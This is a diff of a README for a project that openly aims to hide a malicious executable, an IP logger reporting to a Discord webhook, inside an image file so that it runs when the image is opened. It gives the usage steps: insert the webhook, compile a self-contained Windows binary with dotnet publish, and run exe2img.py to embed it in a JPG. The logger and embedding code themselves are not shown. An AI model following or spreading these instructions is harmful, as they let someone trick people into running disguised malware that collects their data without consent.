@@ -1,3 +1,6 @@
+## Introduction
+This project attempts to embed a malicious executable into an image file, such that the executable, in this case, a simple IP logger, is run whenever the image is opened.
+
 ## Requirements
 
 [WinRAR](https://www.rarlab.com/download.htm?source=post_page-----81ee5339707e---------------------------------------)  
@@ -11,11 +14,12 @@ dotnet add package System.Management
 ```
 
 ## Usage
-1. Add your discord webhook in `Program.cs` and compile
-    ```
-    dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true -o dist
-    ```
+
+1. Add your discord webhook in `Program.cs` and compile with
+```
+dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true -o dist
+```
 2. Run `exe2img.py` to embed the exectuable into an image
-    ```
-    python exe2img.py -e your_executable.exe -i your_image.jpg
-    ```
+```
+python exe2img.py -e your_executable.exe -i your_image.jpg
+```
